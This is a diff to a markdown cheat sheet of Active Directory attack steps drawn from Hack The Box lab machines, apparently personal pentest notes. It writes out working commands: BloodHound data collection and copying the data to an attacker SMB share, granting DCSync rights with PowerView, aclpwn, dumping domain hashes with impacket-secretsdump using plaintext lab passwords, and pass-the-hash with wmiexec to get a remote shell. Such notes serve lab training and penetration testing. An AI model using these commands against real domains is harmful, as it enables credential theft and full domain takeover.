@@ -42,13 +42,26 @@
 32. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
 33. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
 34. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
-35. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
-36. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
-37. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
-38. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
-39. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
-40. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
-41. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
+35. Or upload al the json files
+36. Search for the username that you have pawned on the top left.
+37. One thing you can do is hit this query, it will give what we can do next, see info for more
+```diff
++ MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
+```
+38. U might get permission to change another user password so try
+```diff
+@@ rpcclient -U blackfield.local/audit2020 -I 10.10.10.192 dc01.blackfield.local Password → 0xgeorge @@
+```
+38. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
+39. Dsync attack 
+```diff
+@@ Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync ? @@
+```
+41. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
+42. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
+43. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
+44. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
+45. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
 # Initial Attack Vector
 ### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
